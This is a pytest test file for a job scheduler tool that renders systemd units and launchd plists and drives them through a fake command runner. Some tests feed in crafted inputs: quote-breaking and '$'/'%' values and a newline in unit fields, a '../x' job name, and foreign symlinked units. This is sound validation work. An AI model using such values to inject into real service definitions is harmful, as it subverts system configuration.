"""Scheduler role adapters (systemd, launchd) and the `schedule` key of a job file. Units are rendered and written
through install; systemctl and launchctl are never called: a fake runner records the argv."""

from __future__ import annotations

import hashlib
import json
import plistlib
from datetime import UTC, datetime, timedelta, timezone

import pytest

from ws import cli, install, jobs, osinfo, roles
from ws.roles import _schedule, launchd, systemd

WS = ["/opt/ws/bin/ws"]
CONTRACT = (
    'timeout_s = 600\non_failure = "alert"\nlog = "file"\nuninstall = "ws schedule remove x"\n'
    'expected_rate = "1d"\ndata_class = "none"\n'
)
AI_JOB = (
    'runner = "claude-code"\nmodel = "m1"\nprompt = "Summarise."\nschedule = "daily 03:30"\n'
    "max_turns = 5\nbudget_usd = 0.5\n" + CONTRACT
)
LINKED_DAILY = [  # what `systemctl link` gets for one job: its units, the shared slice, the alert and dead-man units
    "ws-alert@.service", "ws-daily.service", "ws-daily.timer", "ws-jobs.slice",
    "ws-queue-reap.service", "ws-queue-reap.timer", "ws-watch-deadman.service", "ws-watch-deadman.timer",
]  # fmt: skip
BACKUP_JOB = 'command = "backup"\nschedule = "weekly mon 09:05"\n' + CONTRACT


@pytest.fixture(autouse=True)
def fixed_ws(monkeypatch):
    monkeypatch.setattr(_schedule, "ws_command", lambda env: list(WS))


class Fake:
    def __init__(self, code=0, out=""):
        self.calls, self.code, self.out = [], code, out

    def __call__(self, argv):
        self.calls.append(argv)
        return self.code, self.out


# ---- the schedule key ------------------------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "want"),
    [
        ("hourly", "hourly"),
        ("daily 03:30", "daily 03:30"),
        ("Daily 3:05", "daily 03:05"),
        ("weekly mon 09:00", "weekly mon 09:00"),
        ("weekly Sunday 23:59", "weekly sun 23:59"),
    ],
)
def test_schedule_grammar(text, want):
    assert str(jobs.parse_schedule(text, "x")) == want


@pytest.mark.parametrize(
    "text", ["", "daily", "daily 24:00", "daily 3:5", "weekly 09:00", "weekly mox 09:00", "every day", "hourly 05"]
)
def test_bad_schedules_name_the_key(text):
    with pytest.raises(jobs.JobError, match="x: schedule"):
        jobs.parse_schedule(text, "x: schedule")


def test_scheduled_lists_runner_and_command_jobs(box, write_job, env):
    write_job("daily", AI_JOB)
    write_job("backup", BACKUP_JOB)
    write_job("unscheduled", AI_JOB.replace('schedule = "daily 03:30"\n', ""))
    got = {s.name: s for s in jobs.scheduled(env)}
    assert set(got) == {"daily", "backup"}
    assert got["daily"].argv == ("run", "daily") and str(got["daily"].when) == "daily 03:30"
    assert got["backup"].argv == ("backup", "run") and got["backup"].when.weekday == 0


def test_scheduled_without_a_jobs_folder_is_empty(box, env):
    assert jobs.scheduled(env) == []


def test_a_bad_job_gets_no_timer(box, write_job, env):
    write_job("daily", AI_JOB.replace("claude-code", "nope"))
    with pytest.raises(jobs.JobError, match="runner 'nope'"):
        jobs.scheduled(env)
    write_job("daily", AI_JOB.replace("daily 03:30", "whenever"))
    with pytest.raises(jobs.JobError, match="schedule must be"):
        jobs.scheduled(env)
    write_job("daily", 'command = "rm-everything"\nschedule = "hourly"\n')
    with pytest.raises(jobs.JobError, match="command 'rm-everything' is not known"):
        jobs.scheduled(env)


def test_ws_run_refuses_a_command_job_and_loads_a_scheduled_runner_job(box, write_job, env):
    write_job("backup", BACKUP_JOB)
    with pytest.raises(jobs.JobError, match="ws command on a schedule"):
        jobs.load("backup", env)
    write_job("daily", AI_JOB)
    assert str(jobs.load("daily", env).schedule) == "daily 03:30"


# ---- systemd ---------------------------------------------------------------------------------------------------------


def job(name="daily", when="daily 03:30", argv=None):
    return jobs.Scheduled(name, jobs.parse_schedule(when, "t"), tuple(argv or ("run", name)))


def test_systemd_service_and_timer(env):
    files = systemd.render(job(), env, WS)
    assert set(files) == {"ws-daily.service", "ws-daily.timer"}
    svc, timer = files["ws-daily.service"], files["ws-daily.timer"]
    assert 'ExecStart="/opt/ws/bin/ws" "run" "daily"' in svc and "Type=oneshot" in svc
    assert f'Environment="WS_HOME={env["WS_HOME"]}"' in svc and 'Environment="PATH=/usr/bin:/bin"' in svc
    assert "OnCalendar=*-*-* 03:30:00" in timer and "Unit=ws-daily.service" in timer
    assert "WantedBy=timers.target" in timer


def test_a_unit_carries_the_four_folders_in_the_xdg_layout_and_pins_the_old_folder_by_name(tmp_path):
    home = tmp_path / "xdg-home"
    home.mkdir()
    xdg = {"HOME": str(home), "PATH": "/usr/bin:/bin"}
    svc = systemd.render(job(), xdg, WS)["ws-daily.service"]
    for var, folder in (
        ("WS_CONFIG_DIR", home / ".config" / "ws"),
        ("WS_STATE_DIR", home / ".local" / "state" / "ws"),
        ("WS_DATA_DIR", home / ".local" / "share" / "ws"),
        ("WS_CACHE_DIR", home / ".cache" / "ws"),
    ):
        assert f'Environment="{var}={folder}"' in svc
    assert "WS_HOME=" not in svc
    plist = launchd.render(job(), xdg, WS)
    assert "WS_STATE_DIR" in plist and "WS_HOME" not in plist
    (home / ".ws").mkdir()  # an earlier ws's folder: pinned by name; `ws migrate` writes the units again after the move
    old = systemd.render(job(), xdg, WS)["ws-daily.service"]
    assert f'Environment="WS_HOME={home / ".ws"}"' in old and "WS_STATE_DIR" not in old
    assert f"<string>{home / '.ws'}</string>" in launchd.render(job(), xdg, WS)


def test_every_timer_catches_up_whatever_the_stays_on_answer(env):
    for stays_on in (True, False):
        files = systemd.steps({}, install.Answers(stays_on=stays_on), env)
        assert all("Persistent=true" in st.content for st in files if st.path.suffix == ".timer")
    assert "Persistent=true" in systemd.render(job(), env, WS)["ws-daily.timer"]


@pytest.mark.parametrize(
    ("when", "want"),
    [
        ("hourly", "*-*-* *:00:00"),
        ("daily 3:05", "*-*-* 03:05:00"),
        ("weekly mon 09:00", "Mon *-*-* 09:00:00"),
        ("weekly sunday 21:30", "Sun *-*-* 21:30:00"),
    ],
)
def test_on_calendar(when, want):
    assert systemd.on_calendar(jobs.parse_schedule(when, "t")) == want


def test_systemd_quotes_what_systemd_would_expand(env):
    odd = {**env, "WS_HOME": '/tmp/we ird/50%/$x"y', "PATH": "/a%b:/c"}
    svc = systemd.render(job(), odd, ["/p ath/ws"])["ws-daily.service"]
    assert 'ExecStart="/p ath/ws" "run" "daily"' in svc
    assert 'Environment="WS_HOME=/tmp/we ird/50%%/$x\\"y"' in svc  # Environment= takes $ literally; only % is special
    exec_odd = systemd.render(jobs.Scheduled("d", job().when, ("run", "a$b%c")), env, WS)["ws-d.service"]
    assert 'ExecStart="/opt/ws/bin/ws" "run" "a$$b%%c"' in exec_odd  # ExecStart= expands $ and %
    assert "PATH=" not in svc  # a PATH with % is left out, not mangled
    with pytest.raises(ValueError, match="control character"):
        systemd.render(job(), {**env, "WS_HOME": "/tmp/a\nb"}, WS)


def test_systemd_steps_install_and_uninstall(box, write_job, env, linux):
    write_job("daily", AI_JOB)
    write_job("backup", BACKUP_JOB)
    steps = systemd.steps({}, install.Answers(stays_on=False), env)
    assert sorted(s.path.name for s in steps) == [
        "logs",
        "ws-alert@.service",
        "ws-backup.service",
        "ws-backup.timer",
        "ws-daily.service",
        "ws-daily.timer",
        "ws-jobs.slice",
        "ws-queue-reap.service",
        "ws-queue-reap.timer",
        "ws-watch-deadman.service",
        "ws-watch-deadman.timer",
    ]
    assert all(s.path.parent == box / ".ws" / "jobs" / "units" for s in steps if s.path.name != "logs")
    r = install.apply(steps, env)
    assert len(r.created) >= 8
    assert install.apply(steps, env).changes == 0  # a second run reports 0 changes
    fake = Fake()
    removed = install.uninstall(env, deactivate=lambda paths, e: roles.deactivate_units(paths, e, fake))
    assert not list((box / ".ws" / "jobs" / "units").glob("ws-*"))
    assert len([p for p in removed.removed if p.name.startswith("ws-")]) == 10
    # the links systemctl made outside $WS_HOME are undone before the files go
    assert fake.calls[0] == [
        "systemctl",
        "--user",
        "disable",
        "--now",
        "ws-backup.timer",
        "ws-backup.service",
        "ws-daily.timer",
        "ws-daily.service",
        "ws-queue-reap.timer",
        "ws-queue-reap.service",
        "ws-watch-deadman.timer",
        "ws-watch-deadman.service",
    ]
    assert removed.problems == []


def test_uninstall_reports_a_timer_it_could_not_switch_off(box, write_job, env):
    write_job("daily", AI_JOB)
    install.apply(systemd.steps({}, install.Answers(), env), env)
    r = install.uninstall(env, deactivate=lambda paths, e: roles.deactivate_units(paths, e, Fake(1, "no bus")))
    assert r.problems and "no bus" in r.problems[0]
    assert not list((box / ".ws" / "jobs" / "units").glob("ws-*"))  # the files still go


def test_uninstall_leaves_launchd_and_systemd_alone_when_there_are_no_units(box, env):
    install.apply([install.Step(box / ".ws" / "x.txt", "file", "x", "x")], env)
    fake = Fake()
    install.uninstall(env, deactivate=lambda paths, e: roles.deactivate_units(paths, e, fake))
    assert fake.calls == []


def test_deactivate_units_picks_the_adapter_by_file(box, env):
    units = box / ".ws" / "jobs" / "units"
    fake = Fake()
    paths = [units / "ws-a.service", units / "ws-a.timer", units / "ws.job.b.plist", box / "elsewhere" / "ws-c.timer"]
    roles.deactivate_units(paths, env, fake)
    assert ["systemctl", "--user", "disable", "--now", "ws-a.timer", "ws-a.service"] in fake.calls
    assert any(c[:2] == ["launchctl", "bootout"] and c[2].endswith("/ws.job.b") for c in fake.calls)
    assert not any("ws-c.timer" in c for c in fake.calls)


def test_systemd_activate_argv(box, write_job, env):
    write_job("daily", AI_JOB)
    install.apply(systemd.steps({}, install.Answers(), env), env)
    fake, units = Fake(), box / ".ws" / "jobs" / "units"
    assert systemd.activate(env, fake) == []
    assert fake.calls == [
        ["systemctl", "--user", "link", *(str(units / n) for n in LINKED_DAILY)],
        ["systemctl", "--user", "daemon-reload"],
        ["systemctl", "--user", "enable", "--now", "ws-daily.timer", "ws-queue-reap.timer", "ws-watch-deadman.timer"],
    ]


def test_systemd_activate_stops_at_the_first_failure_and_says_so(box, write_job, env):
    write_job("daily", AI_JOB)
    install.apply(systemd.steps({}, install.Answers(), env), env)
    fake = Fake(1, "Failed to connect to bus")
    problems = systemd.activate(env, fake)
    assert len(fake.calls) == 1 and "systemctl --user link" in problems[0] and "bus" in problems[0]


def test_systemd_activate_with_no_units_runs_nothing(box, env):
    fake = Fake()
    assert systemd.activate(env, fake) == [] and fake.calls == []


def _user_dir(box):
    d = box / ".config" / "systemd" / "user"
    d.mkdir(parents=True)
    return d


def test_systemd_activate_links_nothing_over_a_unit_it_did_not_write(box, write_job, env):
    write_job("daily", AI_JOB)
    write_job("weekly", BACKUP_JOB)
    install.apply(systemd.steps({}, install.Answers(), env), env)
    user = _user_dir(box)
    (user / "ws-daily.timer").write_text("[Timer]\nOnCalendar=hourly\n", encoding="utf-8")  # someone else's, no marker
    fake, units = Fake(), box / ".ws" / "jobs" / "units"
    problems = systemd.activate(env, fake)
    assert len(problems) == 1 and "ws-daily" in problems[0] and "isn't ws's" in problems[0]
    assert fake.calls[0] == [
        "systemctl",
        "--user",
        "link",
        str(units / "ws-alert@.service"),
        str(units / "ws-jobs.slice"),
        str(units / "ws-queue-reap.service"),
        str(units / "ws-queue-reap.timer"),
        str(units / "ws-watch-deadman.service"),
        str(units / "ws-watch-deadman.timer"),
        str(units / "ws-weekly.service"),
        str(units / "ws-weekly.timer"),
    ]
    assert fake.calls[2][-1] == "ws-weekly.timer"
    assert (user / "ws-daily.timer").read_text(encoding="utf-8") == "[Timer]\nOnCalendar=hourly\n"


def test_systemd_activate_runs_nothing_when_every_job_clashes(box, write_job, env):
    write_job("daily", AI_JOB)
    install.apply(systemd.steps({}, install.Answers(), env), env)
    (_user_dir(box) / "ws-daily.service").symlink_to(box / "elsewhere.service")  # a link into some other place
    fake = Fake()
    assert len(systemd.activate(env, fake)) == 1 and fake.calls == []


def test_systemd_activate_accepts_its_own_link_and_a_file_with_its_marker(box, write_job, env):
    write_job("daily", AI_JOB)
    install.apply(systemd.steps({}, install.Answers(), env), env)
    units, user = box / ".ws" / "jobs" / "units", _user_dir(box)
    (user / "ws-daily.service").symlink_to(units / "ws-daily.service")
    (user / "ws-daily.timer").write_text(f"{systemd.MARKER} from before\n[Timer]\n", encoding="utf-8")
    fake = Fake()
    assert systemd.activate(env, fake) == [] and len(fake.calls) == 3


def test_a_link_through_a_symlinked_ws_home_is_still_ws_s_own(box, write_job, env):
    write_job("daily", AI_JOB)
    install.apply(systemd.steps({}, install.Answers(), env), env)
    via_link = box / "ws-link"
    via_link.symlink_to(box / ".ws")
    user = _user_dir(box)
    # the user manager holds the link by one spelling of the folder; ws now reaches it by the other
    (user / "ws-daily.service").symlink_to(via_link / "jobs" / "units" / "ws-daily.service")
    (user / "ws-daily.timer").symlink_to(box / ".ws" / "jobs" / "units" / "ws-daily.timer")
    for e in (env, {**env, "WS_HOME": str(via_link)}):
        assert not _schedule.is_foreign(e, "ws-daily.service", systemd.MARKER)
        assert not _schedule.is_foreign(e, "ws-daily.timer", systemd.MARKER)


def test_a_link_into_a_ws_units_folder_of_a_home_that_moved_is_still_ws_s_own(box, env):
    user = _user_dir(box)
    old = box / "old-home" / "jobs" / "units"  # the home the link was made from; nothing is there now
    (user / "ws-daily.timer").symlink_to(old / "ws-daily.timer")
    assert not _schedule.is_foreign(env, "ws-daily.timer", systemd.MARKER)
    (user / "ws-weekly.timer").symlink_to(old / "evil.timer")  # not a ws-* unit
    (user / "ws-monthly.timer").symlink_to(box / "elsewhere" / "units" / "ws-monthly.timer")  # not under jobs/
    (user / "ws-hourly.timer").symlink_to(box / "ws-hourly.timer")
    for name in ("ws-weekly.timer", "ws-monthly.timer", "ws-hourly.timer"):
        assert _schedule.is_foreign(env, name, systemd.MARKER)


def test_systemd_deactivate_leaves_a_unit_it_did_not_write_alone(box, env):
    user = _user_dir(box)
    (user / "ws-a.service").write_text("[Service]\n", encoding="utf-8")
    fake = Fake()
    problems = systemd.deactivate(["a", "b"], env, fake)
    assert len(problems) == 1 and "ws-a.service" in problems[0]
    assert fake.calls[0] == ["systemctl", "--user", "disable", "--now", "ws-a.timer", "ws-b.timer", "ws-b.service"]
    fake = Fake()
    assert len(systemd.deactivate(["a"], env, fake)) == 1 and fake.calls[0][3:] == ["--now", "ws-a.timer"]


def test_the_user_unit_folder_follows_an_absolute_xdg_config_home(box):
    default = box / ".config" / "systemd" / "user"
    assert _schedule.user_unit_dir({"HOME": str(box)}) == default
    assert (
        _schedule.user_unit_dir({"HOME": str(box), "XDG_CONFIG_HOME": str(box / "c")}) == box / "c" / "systemd" / "user"
    )
    assert _schedule.user_unit_dir({"HOME": str(box), "XDG_CONFIG_HOME": "rel"}) == default


def test_systemd_deactivate_argv(env):
    fake = Fake()
    assert systemd.deactivate(["a", "b"], env, fake) == []
    assert fake.calls == [
        ["systemctl", "--user", "disable", "--now", "ws-a.timer", "ws-a.service", "ws-b.timer", "ws-b.service"],
        ["systemctl", "--user", "daemon-reload"],
    ]
    assert systemd.deactivate([], env, fake) == [] and len(fake.calls) == 2


def test_systemd_check(box, write_job, env, linux, mac):
    assert systemd.check({}, mac, env, False)[0] == "fail"
    assert systemd.check({}, linux, env, False) == ("ok", "systemd")
    write_job("daily", AI_JOB)
    status, detail = systemd.check({}, linux, env, False)
    assert status == "warn" and "ws schedule apply" in detail
    install.apply(systemd.steps({}, install.Answers(), env), env)
    status, detail = systemd.check({}, linux, env, False)
    assert status == "ok" and "1 scheduled job" in detail
    write_job("daily", AI_JOB.replace("daily 03:30", "daily 04:00"))
    assert systemd.check({}, linux, env, False)[0] == "warn"
    write_job("daily", AI_JOB.replace("claude-code", "nope"))
    assert systemd.check({}, linux, env, False)[0] == "fail"


# ---- launchd ---------------------------------------------------------------------------------------------------------


def test_launchd_plist(env):
    plist = plistlib.loads(
        launchd.render(job("weekly-digest", "weekly mon 09:05", ("run", "weekly-digest")), env, WS).encode()
    )
    assert plist["Label"] == "ws.job.weekly-digest"
    assert plist["ProgramArguments"] == [*WS, "run", "weekly-digest"]
    assert plist["StartCalendarInterval"] == {"Hour": 9, "Minute": 5, "Weekday": 1}
    assert plist["EnvironmentVariables"] == {
        "WS_HOME": env["WS_HOME"], "PATH": "/usr/bin:/bin", "WS_ALERT_ON_EXIT": "1",
    }  # fmt: skip
    assert plist["StandardOutPath"] == plist["StandardErrorPath"] and plist["StandardOutPath"].endswith(
        "weekly-digest.log"
    )


@pytest.mark.parametrize(
    ("when", "want"),
    [
        ("hourly", {"Minute": 0}),
        ("daily 03:30", {"Hour": 3, "Minute": 30}),
        ("weekly sun 08:00", {"Hour": 8, "Minute": 0, "Weekday": 0}),
        ("weekly sat 08:00", {"Hour": 8, "Minute": 0, "Weekday": 6}),
    ],
)
def test_launchd_interval(when, want):
    assert launchd.interval(jobs.parse_schedule(when, "t")) == want


def test_launchd_steps_install_and_activate(box, write_job, env):
    write_job("daily", AI_JOB)
    steps = launchd.steps({}, install.Answers(), env)
    assert [s.path.name for s in steps if s.kind == "file"] == ["ws.job.daily.plist", "ws.job.queue-reap.plist"]
    assert install.apply(steps, env).changes >= 1
    assert install.apply(steps, env).changes == 0
    fake, plist = Fake(), box / ".ws" / "jobs" / "units" / "ws.job.daily.plist"
    reaper = plist.with_name("ws.job.queue-reap.plist")
    assert launchd.activate(env, fake, uid=501) == []
    assert fake.calls == [
        ["launchctl", "bootout", "gui/501/ws.job.daily"],
        ["launchctl", "bootstrap", "gui/501", str(plist)],
        ["launchctl", "bootout", "gui/501/ws.job.queue-reap"],
        ["launchctl", "bootstrap", "gui/501", str(reaper)],
    ]
    fake = Fake()
    assert launchd.deactivate(["daily"], env, fake, uid=501) == [] and fake.calls == [
        ["launchctl", "bootout", "gui/501/ws.job.daily"]
    ]


def test_launchd_warns_about_an_agent_with_no_schedule(box, write_job, env, mac):
    write_job("daily", AI_JOB)
    install.apply(launchd.steps({}, install.Answers(), env), env)
    write_job("daily", AI_JOB.replace('schedule = "daily 03:30"\n', ""))
    status, detail = launchd.check({}, mac, env, False)
    assert status == "warn" and "daily" in detail
    assert launchd.orphans(env) == ["daily", "queue-reap"]  # the reaper goes with the last job


def test_launchd_with_no_jobs_writes_nothing(box, env):
    assert launchd.steps({}, install.Answers(), env) == []


def test_launchd_bootstrap_failure_is_reported(box, write_job, env):
    write_job("daily", AI_JOB)
    install.apply(launchd.steps({}, install.Answers(), env), env)

    def runner(argv):
        if argv[1] == "bootstrap":
            return (5, "Bootstrap failed") if "daily" in argv[-1] else (0, "")
        return (113, "")

    problems = launchd.activate(env, runner, uid=1)
    assert len(problems) == 1 and "ws.job.daily" in problems[0] and "Bootstrap failed" in problems[0]


def test_launchd_check(box, write_job, env, linux, mac):
    assert launchd.check({}, linux, env, False)[0] == "fail"
    assert launchd.check({}, mac, env, False) == ("ok", "launchd")
    write_job("daily", AI_JOB)
    assert launchd.check({}, mac, env, False)[0] == "warn"
    install.apply(launchd.steps({}, install.Answers(), env), env)
    assert launchd.check({}, mac, env, False)[0] == "ok"


# ---- ws schedule -----------------------------------------------------------------------------------------------------


def run(capsys, *argv):
    code = cli.main(list(argv))
    out = capsys.readouterr()
    return code, out.out, out.err


def test_cli_list_dry_run_apply_remove(box, write_job, env, linux, capsys, monkeypatch):
    monkeypatch.setattr(osinfo, "detect", lambda *a, **k: linux)
    fake = Fake()
    monkeypatch.setattr(_schedule, "run_cmd", fake)
    write_job("daily", AI_JOB)
    code, out, _ = run(capsys, "schedule", "list", "--json")
    assert code == 0 and json.loads(out)["data"] == [{"job": "daily", "when": "daily 03:30", "runs": "ws run daily"}]

    code, out, _ = run(capsys, "schedule", "apply", "--dry-run")
    assert code == 0 and "dry run" in out and fake.calls == []
    assert not (box / ".ws" / "jobs" / "units").exists()

    code, out, _ = run(capsys, "schedule", "apply")
    assert code == 0 and "9 unit file(s)" in out and len(fake.calls) == 3
    assert fake.calls[0][:3] == ["systemctl", "--user", "link"]
    code, out, _ = run(capsys, "schedule", "apply")
    assert code == 0 and "0 changes" in out

    fake.calls.clear()
    code, out, _ = run(capsys, "schedule", "remove", "daily")
    assert code == 0 and "removed 2 unit file(s)" in out
    assert fake.calls[0] == ["systemctl", "--user", "disable", "--now", "ws-daily.timer", "ws-daily.service"]
    left = sorted(p.name for p in (box / ".ws" / "jobs" / "units").glob("ws-*"))
    assert left == sorted(systemd.OWN)  # the shared units stay: slice, alert template, dead-man check
    manifest = (box / ".ws" / "install-manifest.json").read_text()
    assert "ws-daily" not in manifest  # ws removed them itself, so uninstall need not look for them


def test_a_job_whose_schedule_is_gone_loses_its_timer(box, write_job, env, linux, capsys, monkeypatch):
    monkeypatch.setenv("PATH", env["PATH"])  # the CLI reads os.environ; the checks here read env
    monkeypatch.setattr(osinfo, "detect", lambda *a, **k: linux)
    fake = Fake()
    monkeypatch.setattr(_schedule, "run_cmd", fake)
    write_job("daily", AI_JOB)
    write_job("other", AI_JOB)
    assert run(capsys, "schedule", "apply")[0] == 0
    assert systemd.check({}, linux, env, False)[0] == "ok"
    write_job("daily", AI_JOB.replace('schedule = "daily 03:30"\n', ""))  # the schedule is taken out
    status, detail = systemd.check({}, linux, env, False)
    assert status == "warn" and "daily" in detail and "no longer have a schedule" in detail
    fake.calls.clear()
    code, out, _ = run(capsys, "schedule", "apply", "--dry-run")
    assert code == 0 and "would stop daily" in out and fake.calls == []
    assert (box / ".ws" / "jobs" / "units" / "ws-daily.timer").exists()
    code, out, _ = run(capsys, "schedule", "apply")
    assert code == 0 and "stopped daily" in out
    assert fake.calls[0] == ["systemctl", "--user", "disable", "--now", "ws-daily.timer", "ws-daily.service"]
    enable = next(c for c in fake.calls if "enable" in c)
    assert "ws-other.timer" in enable and "ws-daily.timer" not in enable  # only jobs that still have a schedule
    link = next(c for c in fake.calls if "link" in c)
    assert not any("ws-daily" in a for a in link)
    assert not list((box / ".ws" / "jobs" / "units").glob("ws-daily*"))
    assert systemd.check({}, linux, env, False)[0] == "ok"


def test_cli_apply_failure_exits_1_and_remove_checks_the_name(box, write_job, linux, capsys, monkeypatch):
    monkeypatch.setattr(osinfo, "detect", lambda *a, **k: linux)
    monkeypatch.setattr(_schedule, "run_cmd", Fake(1, "no bus"))
    write_job("daily", AI_JOB)
    code, _, err = run(capsys, "schedule", "apply")
    assert code == 1 and "no bus" in err
    code, _, err = run(capsys, "schedule", "remove", "../x")
    assert code == 1 and "job name" in err


def test_cli_apply_on_a_machine_without_a_scheduler(box, capsys, monkeypatch):
    monkeypatch.setattr(osinfo, "detect", lambda *a, **k: osinfo.OSInfo("wsl", "ubuntu 24.04", "x86_64", "none", True))
    code, _, err = run(capsys, "schedule", "apply")
    assert code == 1 and "no scheduler" in err


# ---- the run contract in the units -------------------------------------------------------------------------------------


def _sched(**kw):
    return jobs.Scheduled("daily", jobs.parse_schedule("daily 03:30", "t"), ("run", "daily"), **kw)


def test_the_service_holds_the_failure_hook_the_timeout_and_the_slice(env):
    svc = systemd.render(_sched(timeout_s=600), env, WS)["ws-daily.service"]
    assert "TimeoutStartSec=630" in svc and "Slice=ws-jobs.slice" in svc
    assert "OnFailure=ws-alert@%n.service" in svc
    assert "ws-alert@.service" in systemd.render_watch(env, WS)  # the unit it names is generated with it
    assert f"StandardOutput=append:{_schedule.logs_dir(env) / 'daily.log'}" in svc
    assert 'ExecStopPost=-"/opt/ws/bin/ws" "watch" "rotate" "daily"' in svc  # command jobs rotate too
    journal = systemd.render(_sched(log="journal"), env, WS)["ws-daily.service"]
    assert "StandardOutput" not in journal and "ExecStopPost" not in journal


def test_a_job_file_with_no_timeout_keeps_the_no_limit_it_had(env):
    """A oneshot has no start timeout; an upgrade must not give an existing job one (it would be killed at 15.5 min)."""
    assert "TimeoutStartSec=infinity" in systemd.render(_sched(), env, WS)["ws-daily.service"]


def test_every_unit_says_it_is_generated_and_keeps_the_marker_first(env):
    files = systemd.render(_sched(), env, WS)
    for text in (*files.values(), systemd.render_slice()):
        first = text.splitlines()[0]
        assert first.startswith(systemd.MARKER) and "DO NOT EDIT" in first and "ws schedule apply" in first
    assert "jobs/daily.toml" in files["ws-daily.timer"].splitlines()[0]


def test_the_slice_gives_scheduled_jobs_a_cpu_and_memory_share(env):
    text = systemd.render_slice()
    assert "CPUWeight=50" in text and "MemoryHigh=75%" in text


def test_launchd_has_no_hook_in_the_plist_but_runs_in_the_background_class(env):
    plist = plistlib.loads(launchd.render(_sched(), env, WS).encode())
    assert plist["ProcessType"] == "Background" and "OnFailure" not in plist


def test_the_alert_template_and_the_deadman_units(env):
    files = systemd.render_watch(env, WS)
    assert set(files) == {
        "ws-alert@.service", "ws-watch-deadman.service", "ws-watch-deadman.timer", "ws-queue-reap.service",
        "ws-queue-reap.timer",
    }  # fmt: skip
    alert, dead = files["ws-alert@.service"], files["ws-watch-deadman.service"]
    assert 'ExecStart="/opt/ws/bin/ws" "watch" "alert" "%i"' in alert and "OnFailure" not in alert  # no loop
    assert 'ExecStart="/opt/ws/bin/ws" "watch" "deadman"' in dead and "SuccessExitStatus=3" in dead
    assert "OnFailure=ws-alert@%n.service" in dead and "Persistent=true" in files["ws-watch-deadman.timer"]


def test_the_watch_units_come_with_the_first_job_and_are_not_orphans(box, write_job, env, linux):
    assert systemd.steps({}, install.Answers(), env) == []  # no jobs, no units
    write_job("daily", AI_JOB)
    names = {s.path.name for s in systemd.steps({}, install.Answers(), env)}
    assert {"ws-alert@.service", "ws-watch-deadman.timer", "ws-watch-deadman.service"} <= names
    install.apply(systemd.steps({}, install.Answers(), env), env)
    assert systemd.orphans(env) == []
    assert systemd.check({}, linux, env, False)[1].startswith("systemd: 1 scheduled job,")


def test_a_launchd_plist_tells_ws_run_to_alert_from_its_exit_path(env):
    plist = plistlib.loads(launchd.render(_sched(), env, WS).encode())
    assert plist["EnvironmentVariables"]["WS_ALERT_ON_EXIT"] == "1"


# ---- the timer's tick, the reaper, monthly and script jobs (C499 items 8 and 10, C397) ------------------------------

KEYED_JOB = AI_JOB + '[[secrets]]\nname = "anthropic"\nhost = "api.anthropic.com"\n'  # an API key: the queue runs it
TICK = ("queue", "tick", "daily", "--slot", "schedule", "--run")


def test_a_job_with_an_api_key_ticks_the_queue_and_one_on_a_subscription_keeps_ws_run(box, write_job, env):
    write_job("daily", KEYED_JOB)
    write_job("sub", AI_JOB)
    got = {s.name: s for s in jobs.scheduled(env)}
    assert got["daily"].argv == TICK and got["daily"].records
    assert got["sub"].argv == ("run", "sub") and got["sub"].records  # the queue never runs a subscription login
    service = systemd.render(got["daily"], env, WS)["ws-daily.service"]
    assert 'ExecStart="/opt/ws/bin/ws" "queue" "tick" "daily" "--slot" "schedule" "--run"' in service
    plist = plistlib.loads(launchd.render(got["daily"], env, WS).encode())
    assert plist["ProgramArguments"] == [*WS, *TICK]


@pytest.mark.parametrize(
    ("when", "now", "want"),
    [  # in a zone 13 hours ahead of UTC (a New Zealand summer), so a local-time slot is not a UTC one
        ("hourly", "2026-11-17T02:30:05", "2026-11-17T02:00:00"),
        ("every 10m", "2026-11-17T02:39:59", "2026-11-17T02:30:00"),
        ("daily 03:00", "2026-11-17T02:30:00", "2026-11-16T14:00:00"),  # 15:30 local: today's 03:00
        ("daily 16:00", "2026-11-17T02:30:00", "2026-11-16T03:00:00"),  # before 16:00 local: yesterday's
        ("daily 15:30", "2026-11-17T02:30:00", "2026-11-17T02:30:00"),  # at the slot itself: that slot
        ("weekly mon 09:00", "2026-11-17T02:30:00", "2026-11-15T20:00:00"),  # Tuesday local: Monday's
        ("weekly tue 16:00", "2026-11-17T02:30:00", "2026-11-10T03:00:00"),  # later today: last week's
        ("monthly 1 04:00", "2026-11-17T02:30:00", "2026-10-31T15:00:00"),
        ("monthly 20 04:00", "2026-11-17T02:30:00", "2026-10-19T15:00:00"),  # not yet this month: last month's
        ("monthly 5 04:00", "2026-01-03T02:30:00", "2025-12-04T15:00:00"),  # across the year
    ],
)
def test_the_latest_slot_of_a_schedule(when, now, want):
    tz = timezone(timedelta(hours=13))
    got = jobs.latest_slot(jobs.parse_schedule(when, "t"), datetime.fromisoformat(now).replace(tzinfo=UTC), tz)
    assert got == datetime.fromisoformat(want).replace(tzinfo=UTC)


def test_a_late_fire_gets_the_slot_it_was_for():
    """A catch-up fire after the machine was off all morning is the 03:00 slot, not the minute it ran."""
    daily = jobs.parse_schedule("daily 03:00", "t")
    late = datetime(2026, 11, 17, 9, 41, 7, tzinfo=UTC)
    assert jobs.latest_slot(daily, late, UTC) == datetime(2026, 11, 17, 3, 0, tzinfo=UTC)


@pytest.mark.parametrize(
    ("text", "want"), [("monthly 1 04:00", "monthly 1 04:00"), ("Monthly 28 23:05", "monthly 28 23:05")]
)
def test_monthly_grammar(text, want):
    assert str(jobs.parse_schedule(text, "x")) == want


@pytest.mark.parametrize("text", ["monthly 0 04:00", "monthly 29 04:00", "monthly x 04:00", "monthly 04:00"])
def test_a_bad_monthly_names_the_key(text):
    with pytest.raises(jobs.JobError, match="x: schedule"):
        jobs.parse_schedule(text, "x: schedule")


def test_monthly_on_both_schedulers():
    when = jobs.parse_schedule("monthly 7 04:30", "t")
    assert systemd.on_calendar(when) == "*-*-07 04:30:00"
    assert launchd.interval(when) == {"Day": 7, "Hour": 4, "Minute": 30}


def test_the_reaper_runs_every_two_minutes_on_both_schedulers(box, write_job, env):
    files = systemd.render_watch(env, WS)
    assert 'ExecStart="/opt/ws/bin/ws" "queue" "reap"' in files["ws-queue-reap.service"]
    assert "OnFailure=" not in files["ws-queue-reap.service"]  # a broken queue must not alert every two minutes
    assert "OnCalendar=*-*-* *:00/2:00" in files["ws-queue-reap.timer"]
    plist = plistlib.loads(launchd.render_reaper(env, WS).encode())
    assert plist["ProgramArguments"] == [*WS, "queue", "reap"] and plist["StartInterval"] == 120
    with pytest.raises(jobs.JobError, match="reserved"):
        write_job("queue-reap", BACKUP_JOB)
        jobs.scheduled(env)


def script_job(path: str, sha: str, extra: str = "") -> str:
    return (
